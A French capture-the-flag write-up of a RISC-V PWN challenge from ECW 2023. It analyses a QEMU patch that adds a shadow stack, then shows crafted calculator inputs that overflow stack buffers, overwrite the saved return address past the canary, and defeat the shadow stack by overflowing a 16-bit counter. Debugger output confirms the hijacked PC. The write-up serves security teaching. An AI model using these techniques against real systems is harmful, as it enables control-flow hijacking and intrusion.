---
title: "The Calculator in Shadow"
date: 2023-10-25
comment: true
tags: ["PWN", "ECW 2023"]
---

## Introduction

J'ai eu la chance de pouvoir participer aux qualifications de l'ECW 2023 durant lequel j'ai pu flag un challenge de PWN super intéressant proposé par Thales, j'en fait donc un write-up histoire de montrer de quoi il s'agissait 😉. L'objectif était d'exploiter un binaire `RISC-V` implémentant des fonctionalités de sécurités additionnelles mises en place par l'intermédiaire d'un patch de qemu. Commençons tout de suite!

## Prise en main du challenge

L'énoncé se présentait comme ceci:

```text
ALICE has a secret: it is not really good at mental calculations. However,
 fret not, since ALICE solved the issue by emulating a RISCV 64-bit proces
sor, and running a custom calculator on top of it.We think that we may gai
n some way to fight ALICE by exploiting its calculator, so we secured an a
ccess to it! We also got a leak of the source, you will therefore find it 
attached. Hey, aren't we efficient? Now's your turn to act! However it see
ms ALICE doesn't emulate a standard RISCV 64-bit processor, but added an o
bscure thing to it. There are, consequently, custom instructions in the ca
lculator code. Well, now that seems very shady...
```

Ok, donc on va devoir travailler sur du RISC-V, avec ceci nous était fourni une archive contenant les sources du challenge, des version déjà compilées ainsi qu'un README très détaillé nous donnant un lien vers une image docker contenant déjà l'installation qemu nécessaire pour nous éviter de nous prendre la tête et c'est très sympa de la part des devs 😅. On peut donc lancer le programme comme ceci:

```text
~/qemu/build/qemu-riscv64 -L ~/riscv/sysroot ~/calculator/build/bin/calculator

>> 3 * (2 + 1)

Result: 9
```

La calculatrice se lance bien, on va plonger dans le code fourni en quête de vulnérabilités à exploiter 🕵, et dans un premier temps on va s'intéresser au patch de qemu.

## Analyse du code

### Analyse du patch qemu

En plus des fichiers sources de la calculatrice, venaient deux fichiers de patchs: `qemu.diff` et `binutils.diff` ayant pour objectif d'implémenter deux nouvelles instructions à l'ISA RISC-V: `obscure <rx>` et `dusk <rx>`. On va commencer par s'intéresser à la première instruction.

#### Analyse de l'instruction "dusk"

Voilà le code de la fonction `trans_dusk` qui est appellée à chaque fois que l'instruction est exécutée par le processeur émulé par QEMU.

```c
// qemu.diff
diff --git a/target/riscv/insn_trans/trans_shadow.c.inc b/target/riscv/insn_trans/trans_shadow.c.inc
new file mode 100644
index 0000000000..8d98f413bb
--- /dev/null
+++ b/target/riscv/insn_trans/trans_shadow.c.inc
@@ -0,0 +1,27 @@
+static bool trans_dusk(DisasContext *ctx, arg_dusk *a)
+{
+    TCGv_i32 csr_darkpage = tcg_constant_i32(CSR_DARKPAGE);
+    gen_helper_csrw(cpu_env, csr_darkpage, get_gpr(ctx, a->rs1, EXT_NONE));
+
+    TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
+    TCGv zero = tcg_constant_tl(0);
+    gen_helper_csrw(cpu_env, csr_darkoff, zero);
+
+    return true;
+}
```

Pour mieux comprendre ce que fait ce code, on peut se réferrer à la documentation frontend de Qemu [ici](https://wiki.qemu.org/Documentation/TCG/frontend-ops).

Dans le contexte de la fonction `trans_dusk`, la variable `a->rs1` désigne le registre associé au premier argument, la fonction va donc écrire la valeur passée dans le premier registre dans un `Registre de Status et de Control` nommé `CSR_DARKPAGE` initialisé un peu plus haut dans le code. Ce registre de contrôle permet d'interagir avec une variable globale nommée `dark_page` de type `target_ulong` (64 bits dans notre cas) comme on peut le voir ci-desous:

```c
// qemu.diff
@@ -4028,6 +4066,10 @@ riscv_csr_operations csr_ops[CSR_TABLE_SIZE] = {
     /* Crypto Extension */
     [CSR_SEED] = { "seed", seed, NULL, NULL, rmw_seed },
 
+    /* Shadow Extension */
+    [CSR_DARKPAGE] = {"vdarkpage", shadow, read_dark_page, write_dark_page},
+    [CSR_DARKOFF]  = {"vdarkoff", shadow, read_dark_offset, write_dark_offset},
+

[...]

+static RISCVException read_dark_page(CPURISCVState *env, int csrno,
+                                     target_ulong *val)
+{
+    *val = env->dark_page;
+    return RISCV_EXCP_NONE;
+}
+
+static RISCVException write_dark_page(CPURISCVState *env, int csrno,
+                                      target_ulong val)
+{
+    env->dark_page = val;
+    return RISCV_EXCP_NONE;
+}
+
```

La variable est initialisée avec la valeur du registre passé en argument de l'instruction dusk. Un autre CSR nommé `CSR_DARKOFF` va être associé à une autre varaible nommée variable `dark_offset` qui est de type `uint16_t` et est initialisée à 0. Cette instruction est executée une seule fois dans le programme de la calculatrice, dans la fonction `blue_hour` qui est appellée au tout début du programme:

```c
// calculator/src/shadow.c
void blue_hour (void) {
  #ifndef SUNBATH
  void *page = mmap(NULL, 64 * 1024, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  if (page == MAP_FAILED) {
    error(ERROR_DUSK_MMAP);
  }

  asm volatile(
    "dusk %0"
    :
    : "r" (page)
  );
  #endif
}
```

Ok donc la fonction `blue_hour` va donc allouer avec mmap 64 * 1024 octets (16 pages) et passer l'adresse retournée à l'instruction dusk qui va la garder dans la variable dark_page de QEMU. On note que la variable dark_offset est quant à elle mise à 0.

#### Analyse de l'instruction "obscure"

On peut maintenant s'intéresser à la fonction `trans_obscure` qui est appellée à chaque fois que l'émulateur exécutera l'instruction obscure:

```c
// qemu.diff
+static bool trans_obscure(DisasContext *ctx, arg_obscure *a)
+{
+    TCGv dark_offset = tcg_temp_new();
+    TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
+    gen_helper_csrr(dark_offset, cpu_env, csr_darkoff);
+    TCGv darkest_address = get_darkest_address(ctx, dark_offset);
+
+    TCGv saved_data = get_gpr(ctx, a->rs1, EXT_NONE);
+    tcg_gen_qemu_st_tl(saved_data, darkest_address, ctx->mem_idx,
+                       MO_ALIGN | MO_TE | size_memop(get_xlen_bytes(ctx)));
+
+    tcg_gen_addi_tl(dark_offset, dark_offset, get_xlen_bytes(ctx));
+    gen_helper_csrw(cpu_env, csr_darkoff, dark_offset);
+    return true;
+}
```

Cette fonction fonctionne de manière assez similaire à la précédente et va récupérer la valeur du premier registre passé en argument grâce à la fonction `get_gpr` et la stocker à l'adresse `dark_page + dark_offset`, la dernière place non occupée dans la dark_page est récupérée avec la fonction `get_darkest_address` comme on peut le voir ici:

```c
// qemu.diff
+static TCGv get_darkest_address(DisasContext *ctx, TCGv dark_offset)
+{
+    TCGv dark_page = tcg_temp_new();
+    TCGv_i32 csr_darkpage = tcg_constant_i32(CSR_DARKPAGE);
+    gen_helper_csrr(dark_page, cpu_env, csr_darkpage);
+
+    TCGv darkest_address = tcg_temp_new();
+    tcg_gen_add_tl(darkest_address, dark_page, dark_offset);
+
+    return darkest_address;
+}
```

Par ailleurs la fonction `get_xlen_bytes` retourne simplement le nombre de bits de l'architecture convertit en octets (8 en l'occurence). Là où ca devient intéressant c'est où cette instruction est executée:

```c
// calculator/include/shadow.h
#define IN_SHADOW \
  asm volatile(   \
    "obscure ra"  \
  );

[...]

// calculator/src/calc.c
error_kind secure_calc (char input[], node_t* node_root, int64_t* result) {
  IN_SHADOW

  if (MAX_OPS < count_ops(input)) {
    return ERROR_OPS_LIMIT;
  }

  return calc(node_root, result);
}
```

Le programme définit une directive `define` à partir de cette instruction qui sera appellée à chaque prologue de fonction de la calculatrice. On en déduit donc qu'à chaque appel de fonction, l'adresse de retour contenue dans le registre `RA` sera stockée dans la dark_page. Pour mieux comprendre là où le programme veut en venir il nous faut analyser le patch de la fonction `trans_jalr`.


#### Analyse du patch de l'instruction "jalr"

En architecture RISC-V l'instruction `jalr` où "Jump and Link Register" se présente comme ceci: `jalr xa, xb, n` et effecute un saut indirect à l'adresse pointée par `xb + n` en sauvegardant l'adresse de retour dans `xa`. Cette instruction est notamment utilisée pour faire l'équivalent d'un `ret` en architecture intel lorsque elle est utilisée sous cette forme `jalr zero, ra, 0` et c'est ce cas particulier qui est visé par le patch de QEMU:

```c
// qemu.diff
--- a/target/riscv/insn_trans/trans_rvi.c.inc
+++ b/target/riscv/insn_trans/trans_rvi.c.inc
@@ -65,6 +65,30 @@ static bool trans_jalr(DisasContext *ctx, arg_jalr *a)
     }
 
     gen_set_gpri(ctx, a->rd, ctx->pc_succ_insn);
+
+    if (a->rd == 0 && a->rs1 == xRA && a->imm == 0) {
+        TCGLabel *shadow_pact_end = gen_new_label();
+
+        TCGv dark_offset = tcg_temp_new();
+        TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
+        gen_helper_csrr(dark_offset, cpu_env, csr_darkoff);
+        tcg_gen_brcondi_tl(TCG_COND_EQ, dark_offset, 0, shadow_pact_end);
+
+        tcg_gen_addi_tl(dark_offset, dark_offset, -1 * get_xlen_bytes(ctx));
+        gen_helper_csrw(cpu_env, csr_darkoff, dark_offset);
+        TCGv darkest_address = get_darkest_address(ctx, dark_offset);
+
+        TCGv dark_pc = tcg_temp_new();
+        tcg_gen_qemu_ld_tl(dark_pc, darkest_address, ctx->mem_idx,
+                           MO_ALIGN | MO_TE | size_memop(get_xlen_bytes(ctx)));
+        tcg_gen_brcond_tl(TCG_COND_EQ, cpu_pc, dark_pc, shadow_pact_end);
+
+        tcg_gen_st_tl(cpu_pc, cpu_env, offsetof(CPURISCVState, badaddr));
+        generate_exception(ctx, RISCV_EXCP_SHADOW);
+
+        gen_set_label(shadow_pact_end);
+    }
+
```

Cette modification de l'instruction ret s'appuie sur les deux instructions customs et va vérifier à chaque ret que la dernière adresse de retour présente sur la dark_page est bien égale à celle contenue dans le registre RA, dans le cas contraire, l'exception `RISCV_EXCP_SHADOW` est levée et le processeur s'arrête. A chaque ret, le compteur dark_offset est décrémentée de 8 (la taille d'une adresse), aussi si le compteur vaut 0, la fonction retourne sans lever d'exception.

On en déduit que l'objectif de ce patch est de mettre en place une `shadow stack` pour éviter les techniques d'exploitations visant à overwrite la valeur de l'adresse de retour comme les stack buffer overflows! Si on veut exploiter notre progamme avec une ROP-chain par exemple, il nous faudra un moyen d'outrepasser cette protection supplémentaire.

Je passe sur l'analyse du fichier `binutils.diff` dont la seule utilité est de permettre aux composants comme gcc de fonctionner avec les instructions custom.

### Analyse du code

Tout d'abord, le binaire a été compilé avec la NX, mais sans le PIE, ni ASLR ce qui va nous faciliter la tâche pour l'exploiter 😁, en revanche un Canary est présent sur la stack en plus de la mise en place de la shadow stack.

Le programme commence par lire un input de 128 octets depuis stdin, et va ensuite le passer en paramètre à la fonction `yy_scan_string` qui fait partie de l'API de `Yacc`, un analyseur syntaxique qui va parser notre string pour la convertir en `ASTs` qui représenteront l'expression que la calculatrice évaluera. Ces ASTs seront parcourus via un `DFS` dans la fonction `dispatch` que voilà:

```c
// calculator/src/calc.c
error_kind dispatch (node_t* node, int64_t results[], bool completed[]) {
  IN_SHADOW

  error_kind err;

  if (get_completion(node, completed)) {
    return ERROR_NO_ERROR;
  }

  node_t *node_l = node->content.binop.node_l;
  if (!get_completion(node_l, completed)) {
    err = dispatch(node_l, results, completed);
    if (err != ERROR_NO_ERROR) {
      return err;
    }
  }

  node_t *node_r = node->content.binop.node_r;
  if (!get_completion(node_r, completed)) {
    err = dispatch(node_r, results, completed);
    if (err != ERROR_NO_ERROR) {
      return err;
    }
  }

  switch (node->kind) {
    case NODE_PLUS:
      do_plus(node, results);
      break;
    case NODE_MINUS:
      do_minus(node, results);
      break;
    case NODE_TIMES:
      do_times(node, results);
      break;
    case NODE_DIVIDE:
      do_divide(node, results);
      break;
    case NODE_POWER:
      err = do_power(node, results);
      if (err != ERROR_NO_ERROR) {
        return err;
      }
      break;
    default:
      return ERROR_NODE_KIND_UNKNOWN;
      break;
  }

  completed[node->content.binop.id] = true;

  return ERROR_NO_ERROR;
}
```

Chaque node représente soit un nombre soit une expression qui sera évaluée. Mais dans un premier lieu, l'AST est passée en paramètre avec notre input dans la fonction `secure_calc` et `count_ops` qui se chargent de vérifier que le nombre d'expressions constituant notre arbre n'excède pas 16:

```c
// calculator/src/calc.c
#define MAX_OPS 16

[...]

uint8_t count_ops (char input[]) {
  IN_SHADOW

  uint8_t count = 0;
  uint8_t i = 0;
  char c;

  do {
    c = input[i++];

    if (c == '+' || c == '-' || c == '/') {
      count++;
    } else if (c == '*') {
      count++;

      if (input[i] == '*') {
        i++;
      }
    }

  } while (c != '\0');

  return count;
}

error_kind secure_calc (char input[], node_t* node_root, int64_t* result) {
  IN_SHADOW

  if (MAX_OPS < count_ops(input)) {
    return ERROR_OPS_LIMIT;
  }

  return calc(node_root, result);
}
```

En effet, dans le corps de la fonction `calc`, on peut observer la présence de deux buffers de taille 16:

```c
// calculator/src/calc.c
error_kind calc (node_t* node_root, int64_t* result) {
  IN_SHADOW

  int64_t results[MAX_OPS];
  bool completed[MAX_OPS];

  memzero(results, sizeof(int64_t) * MAX_OPS);
  memzero(completed, sizeof(bool) * MAX_OPS);

  if (node_root->kind == NODE_NUMBER) {
    *result = node_root->content.value;
    return ERROR_NO_ERROR;
  }

  error_kind err = dispatch(node_root, results, completed);
  if (err != ERROR_NO_ERROR) {
    return err;
  }

  *result = results[node_root->content.binop.id];
  return ERROR_NO_ERROR;
}
```

Le premier buffer, `results[MAX_OPS]` va se charger de garder les valeurs résultants de l'évaluation de chaque expression. et le buffer `completed[MAX_OPS]` indique si une expression constituant l'arbre a déjà été évaluée ou non. Le programme va parcourir un AST créé à partir de l'expression passé en input, pour celà il va s'appuyer sur les fichiers d'analyse syntaxique `ast.l` et `ast.y`, il va ensuite se baser sur la node root (logiquement la dernière opération à être calculé) pour descendre l'AST. Il est important de noter que l'id associé à une node représente sonc indice dans le tableau et que les nombres simples ne sont pas considérés comme des expressions à part entière. Voilà un schéma représentant l'algorithme de calcul effecuté pour évaluer l'expression `8 * (((3 + 5) / 2) + 2**3)`:

```goat

                  Tableau "results" avant le DFS
                  -------------------------------
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
  0                                                           15


                  Tableau "completed" avant le DFS
                  --------------------------------
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
  0                                                           15
                      ^
                      |
            Point de départ du DFS


                    Arbre de syntaxe abstraite associé
                    ----------------------------------
                              .-.
                             | 4 |    <-- Node multiplicative
                              '-'
                             /   \
                            /     \
                           /       \
       Simple nombre -->  8         .-.
                                   | 3 |    <-- Node additive
                                    '-'
                                   /   \
                                  /     \
                                 /       \
                                /         \
                             .-.           .-.
       Node divisive -->    | 1 |         | 2 |
                             '-'           '-'
                            /   \         /   \
                           /     \       /     \
                          /       \     /       \
                       .-.         2   2         3
                      | 0 |
                       '-'
                      /   \
                     /     \
                    /       \
                   3         5


                  Tableau "results" après le DFS
                  -------------------------------
+---+---+---+----+----+---+---+---+---+---+---+---+---+---+---+---+
| 8 | 4 | 8 | 12 | 96 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+----+----+---+---+---+---+---+---+---+---+---+---+---+
  0                                                             15


                  Tableau "completed" après le DFS
                  --------------------------------
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 1 | 1 | 1 | 1 | 1 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
  0                                                           15

```

Voilà ce que l'on sait sur ces deux buffers:
  * completed est un tableau de `bool`, il fait donc 16 * 1 octets.
  * results est un tableau de `int64_t`, il fait donc 16 * 8 octets (128 octets).
  * completed est placé en mémoire juste avant results.

Un overflow serait donc possible, mais il faut outrepasser la fonction count_ops qui nous empeche actuellement d'overflow les deux buffers et pour voir comment faire, il faut se pencher sur les fichiers d'analyse syntaxique, voilà les fonctions qui gèrent sont appellés par `Yacc` pour créer de nouvelles nodes:

```c
// calculator/ast/ast.y
node_t *node_new (node_kind kind, node_t *node_l, node_t *node_r)
{
  static uint8_t node_count = 0;

  node_t *node = (node_t*) malloc(sizeof(node_t));

  node->kind = kind;
  node->content.binop.id = node_count++;
  node->content.binop.node_l = node_l;
  node->content.binop.node_r = node_r;

  return node;
}

node_t *node_new_number (int64_t value)
{
  node_t *node = (node_t*) malloc(sizeof(node_t));

  node->kind = NODE_NUMBER;
  node->content.value = value;

  return node;
}
```

Les nodes retournées par ces fonctions font donc partie de la liste chainée représentant nos ASTs, seules les nodes retournés par la fonction node_new sont associées à un id dans les deux buffers. En regardant attentivement comment Yacc parse notre expression on voit ceci:

```text
expression  : expression PLUS expression    { $$ = node_new(NODE_PLUS, $1, $3); }
            | expression MINUS expression   { $$ = node_new(NODE_MINUS, $1, $3); }
            | expression TIMES expression   { $$ = node_new(NODE_TIMES, $1, $3); }
            | expression DIVIDE expression  { $$ = node_new(NODE_DIVIDE, $1, $3); }
            | MINUS expression %prec NEG    { $$ = node_new(NODE_MINUS, node_new_number(0), $2); }
            | expression POWER expression   { $$ = node_new(NODE_POWER, $1, $3); }
            | factor                        { $$ = $1; }
            ;

factor  : NUMBER            { $$ = node_new_number($1); }
        | NUMBER purefactor { $$ = node_new(NODE_TIMES, node_new_number($1), $2); }
        | purefactor        { $$ = $1; }
        ;

purefactor  : LPARENTHESIS expression RPARENTHESIS            { $$ = $2; }
            | LPARENTHESIS expression RPARENTHESIS purefactor { $$ = node_new(NODE_TIMES, $2, $4); }
            ;
```

Il y'a deux manières de faire un produit, soit avec l'expression `<expression_0> * <expression_1>`, mais il est aussi possible de faire: `<expression_0> (<expression_1>)`. Or la fonction count_ops ne prend pas en compte cette dernière manière étant donné qu'il ne fait que compter les symboles `+,-,*,/,**`, si l'on essaie d'envoyer une expression constituée de 17 produits comme celle ci:

```bash
challenger@6131181ffae8:~$ printf '1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1(1)))))))))))))))))' | calculator
>> 

================================================
Shadow exception triggered!
(Conveniently handled as an illegal instruction)

The current dark page is 0x0000004000955000
The current dark offset is 0x8
================================================

Illegal instruction (core dumped)
```

On a bien réussi à overflow la stack. Plus précisément on a écrasé les 8 octets qui suivaient le buffer results qui correspondent au canary, au moment de retourner, le programme va donc appeller la fonction `__stack_chk_fail` qui comporte une instruction `jalr` à un endroit et c'est ce qui a déclenché l'exception, voilà un schéma:

```goat


                  Stack avant l'overflow
                  -------------------------------
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | <-- Tableau "completed"
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
  0                                                             15

+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | <-- Tableau "results"
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
 16                                                          143

+--------------------+--------------+---------+
| 0xea4cc73208551300 | 0x4000800420 | 0x13e68 |
+--------------------+--------------+---------+
144      ^        151 152   ^    159 160 ^ 167          
         |                  |            |
      Canary            Saved S0      Saved RA


                  Stack après l'overflow
                  -------------------------------
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | <-- Tableau "completed"
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
  0                                                             15

+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
| 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | <-- Tableau "results"
+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
 16                                                          143

+--------------------+--------------+---------+  ----.
| 0x0000000000000001 | 0x4000800420 | 0x13e68 |       |
+--------------------+--------------+---------+       +---> Le canary est ré-écrit, le programme fail
144      ^        151 152   ^    159 160 ^ 167        |
         |                  |            |            |
      Canary            Saved S0      Saved RA   ----' 
```

Nice! On a trouvé comment overflow, maintenant il faudrait arriver à modifier notre exploit pour overwrite simplement l'adresse de retour et pas le canary. On note que le canary est placé à l'offset 16, que la sauvegarde de `S0` (le base pointer) est gardée à l'offset 17 et que la sauvegarde de `RA` est gardée à l'offset 18.

Pour overwrite RA, Une des manières de faire c'est d'exploiter le fait que le tableau completed est situé juste avant le tableau results ce qui fait que lorsque le DFS ira déréférencer: `completed[16]` pour vérifier si la node d'indice 16 a déjà été évaluée (l'adresse mémoire de cette node correspondrait donc à l'adresse mémoire du canary), il accèdera en réalité à `results[0]` donc si on fait en sorte que notre AST ressemble à ceci:

```goat
                  .--.
                 | 19 |
                  '--'
                 /    \
                /      \
               /        \
              /          \
           .-.            .--.
          | 0 |          | 18 |  <-- node telle que &results[node.id] == RA,
           '-'            '--'       c'est une node additive qui fait donc
          /   \          /    \      0 + NEW_RA, on a donc écrasé la sauvegarde
         /     \        /      \     de RA qui était à l'offset 18.
        /       \      /        \
       1         1    /          \
                  .--.            NEW_RA
                 | 17 |
                  '--'  <-- Node qui va mettre results[17] (sauvegarde de S0) à 0.
                 /    \     De cette manière on aura results[18] (sauvegarde de RA) qui
                /      \    vaudra 0 + NEW_RA = NEW_RA
               /        \
           .--.          0
          | 16 |   --------.
           '--'             |
          /    \            |
         ·      \           |
        ·        \          |
       ·          0         |
      /                     +----> Ces nodes ne seront pas explorées par le DFS
   .-.                      |      car completed[16] = results[0] = 1.
  | 1 |                     |      Le canary n'est donc pas écrasé, seulement
   '-'                      |      La sauvegarde de S0, celle de RA et la valeur
  /   \                     |      qui suit sur la stack.
 /     \                    |
0       0   ---------------'
```

On pourra overwrite la sauvegarde de RA, ainsi que les autres positions mémoires de la stackframe appellante.
Pour comprendre pourquoi le canary n'est pas modifié, il faut se pencher attentivement sur comment le DFS va parcourir notre arbre:

1. Il explore la node d'id 19, on voit dans la fonction dispatch qu'il prend d'abord la node de gauche.
2. Il explore ensuite la node d'id 0 qui va mettre 1 * 1 = 1 à l'adresse `&results[0]` donc `completed[16]`.
3. Il prend ensuite la node 18, puis la 17, puis la 16 et retourne immédiatement étant donné que la node est notée comme déjà complétée à cause du fait que `completed[16]` vaille maitnenant 1.
4. Le DFS remonte donc à la node 17 et écrit donc à `results[17]`, `results[16] (le canary) * 0`. results[17] vaut maintenant 0.
5. Il remonte ensuite à la node 18 et écrit à `results[18] (la save de RA)`, `results[17] + NEW_RA`.
6. Il remonte ensuite à la node 19 pour y écrire mais elle ne nous est d'aucune utilité.


Donc si l'on teste le payload suivant qui devrait produire le même AST:
```
(1*1)(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0)))))))))))))))))+4702111234474983745)`
```
et que l'on break dans gdb-multiarch à la fin de la fonction `calc`, voilà ce que l'on peut voir:

```c
 RA   0x4141414141414141 ('AAAAAAAA')
 GP   0x16800 ◂— 0x0
 TP   0x4000953da0 —▸ 0x4000945228 (_nl_global_locale) —▸ 0x4000941dd0 (_nl_C_LC_CTYPE) —▸ 0x400092bde8 (_nl_C_name) ◂— 0x43 /* 'C' */                                                                        
 T0   0x400081e290 ◂— 0x0
 T1   0x17470 ◂— 0x17
 T2   0x3
 S0   0x0
 S1   0x1
 A0   0x0
 A1   0x4000800348 ◂— 0x1010101
 A2   0x4000800338 ◂— 0x1
 A3   0x0
 A4   0x0
 A5   0x0
 A6   0x174d0 ◂— 0x17
 A7   0x9ef4f319ba96a051
 S2   0x0
 S3   0x15e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x10f24 (__do_global_dtors_aux) ◂— c.addi sp, -0x10                                                                                                 
 S4   0x14260 (main) ◂— c.addi16sp sp, -0xd0
 S5   0x4000800688 —▸ 0x4000800858 ◂— '_=/home/challenger/qemu/build/qemu-riscv64'
 S6   0x15e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x10f24 (__do_global_dtors_aux) ◂— c.addi sp, -0x10                                                                                                 
 S7   0x400081cd78 (_rtld_local_ro) ◂— 0x0
 S8   0x400081d030 (_rtld_local) —▸ 0x400081e290 ◂— 0x0
 S9   0x0
 S10  0x0
 S11  0x0
 T3   0x400089afc8 (free) ◂— 0xff8537837179c54d
 T4   0x76fc8
 T5   0x4000912950 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 T6   0x1f25bc2
*SP   0x40008003e0 ◂— 0xc3c3c3c3c3c38241
*PC   0x13d3a (calc+180) ◂— c.jr ra
──────────────────────────────────[ DISASM / rv64 / set emulate on ]───────────────────────────────────
   0x13d32 <calc+172>    c.mv   a0, a4
   0x13d34 <calc+174>    c.ldsp ra, 0xb8(sp)
   0x13d36 <calc+176>    c.ldsp s0, 0xb0(sp)
   0x13d38 <calc+178>    c.addi16sp sp, 0xc0
 ► 0x13d3a <calc+180>    c.jr   ra                            <0x4141414141414141>
```

Yes! On a réussi à overwrite la sauvegarde de RA!

Avant de construire notre ROP-chain, il va nous falloir
outrepasser la shadow stack mise en place par le patch de QEMU, car si l'on ret maintenant, la valeur `0x4141414141414141`, ne se trouvant pas dans la dark_page, le processeur va lever une exception.


### Bypass de la shadow stack

C'est le problème sur lequel j'ai passé le plus de temps et pourtant la solution était assez évidente! Si vous vous souvenez bien, nous avions noté que la variable `dark_offset` mise en place lors de l'émulation est un entier de 16 bits, c'est très peu et cela signifie que nous pouvons essayer de provoquer un integer overflow. Comment ? Et bien en abusant de la fonction récursive `handle_power` utilisée pour effectuer les calculs de puissance:

```c
void handle_power (node_t* node, int64_t results[], int64_t power) {
  IN_SHADOW

  if (power == 0) {
    return;
  }
  node_t *node_l = node->content.binop.node_l;
  results[node->content.binop.id] *= get_value(node_l, results);
  handle_power(node, results, --power);
}

error_kind do_power (node_t* node, int64_t results[]) {
  IN_SHADOW

  node_t *node_l = node->content.binop.node_l;
  node_t *node_r = node->content.binop.node_r;
  int64_t power = get_value(node_r, results);

  if (power < 0) {
    return ERROR_POWER_NEGATIVE;
  }
  if (power == 0) {
    results[node->content.binop.id] = 1;
    return ERROR_NO_ERROR;
  }

  results[node->content.binop.id] = get_value(node_l, results);
  handle_power(node, results, --power);

  return ERROR_NO_ERROR;
}
```

L'intérêt d'exploiter cette fonction est que si l'on parvient à faire revenir dark_offset à 0, dans ce cas précis, le check dans le patch de l'instruction jalr n'est pas effectué:

```c
+        TCGv dark_offset = tcg_temp_new();
+        TCGv_i32 csr_darkoff = tcg_constant_i32(CSR_DARKOFF);
+        gen_helper_csrr(dark_offset, cpu_env, csr_darkoff);
+        tcg_gen_brcondi_tl(TCG_COND_EQ, dark_offset, 0, shadow_pact_end);
```

Et une fois que le compteur est à 0, le programme va retourner de tous les appels à handle_power, puis de dispatch, puis de calc, puis sur notre exploit sans faire de check sur la shadow stack. Il faut donc faire assez d'appels pour que le compteur dark_offest revienne à 0.

Au moment où la fonction `handle_power` est appellée pour la première fois, la dark_page comporte 4 entrées, respectivement l'adresse de retour de `secure_calc`, `calc`, `dispatch`, `do_power` ce qui implique que dark_offset vaut 4 * 8 = 32 à ce moment là.

Sachant que dark_offset est incrémenté de 8 à chaque appel et qu'il peut représenter au maximum 2**16 - 1,
si on veut que le compteur revienne à 0 il nous suffit de faire en sorte que handle_power s'appelle récursivement au moins (65536 - 32) / 8 fois = 8188 fois.

Je précise "au moins" car si on l'appelle plus que ca, la technique fonctionne aussi.Une fois que 0 est atteint les appels suivants vont s'annuler jusqu'à retomber à 0 MAIS le compteur ne redescendra pas en dessous de 0 car dans le patch de l'instruction jalr, si le compteur dark_offset vaut 0, le check sur la shadow stack n'est pas fait et en plus le compteur n'est pas décrémenté.

Et pour ajouter des appels récursifs à notre payload, il suffit de le "wrapper" dans une node qui se chargera de faire les calculs de puissance:

```text
((1*1)(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0(0)))))))))))))))))+4702111234474983745))**8188
```

On teste et:

```c
RA   0x4141414141414141 ('AAAAAAAA')
 GP   0x16800 ◂— 0x0
 TP   0x4000953da0 —▸ 0x4000945228 (_nl_global_locale) —▸ 0x4000941dd0 (_nl_C_LC_CTYPE) —▸ 0x400092bde8 (_nl_C_name) ◂— 0x43 /* 'C' */                                                                        
 T0   0x400081e290 ◂— 0x0
 T1   0x17470 ◂— 0x17
 T2   0x3
 S0   0x0
 S1   0x1
 A0   0x0
 A1   0x4000800348 ◂— 0x101010101
 A2   0x0
 A3   0x0
 A4   0x0
 A5   0x0
 A6   0x174e0 ◂— 0x17
 A7   0x29ea5ca3aef8c772
 S2   0x0
 S3   0x15e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x10f24 (__do_global_dtors_aux) ◂— c.addi sp, -0x10                                                                                                 
 S4   0x14260 (main) ◂— c.addi16sp sp, -0xd0
 S5   0x4000800688 —▸ 0x4000800858 ◂— '_=/home/challenger/qemu/build/qemu-riscv64'
 S6   0x15e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x10f24 (__do_global_dtors_aux) ◂— c.addi sp, -0x10                                                                                                 
 S7   0x400081cd78 (_rtld_local_ro) ◂— 0x0
 S8   0x400081d030 (_rtld_local) —▸ 0x400081e290 ◂— 0x0
 S9   0x0
 S10  0x0
 S11  0x0
 T3   0x400089afc8 (free) ◂— 0xff8537837179c54d
 T4   0x76fc8
 T5   0x4000912950 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000
 T6   0x1f25bc2
 SP   0x40008003e0 ◂— 0xc3c3c3c3c3c38241
*PC   0x4141414141414140 ('@AAAAAAA')
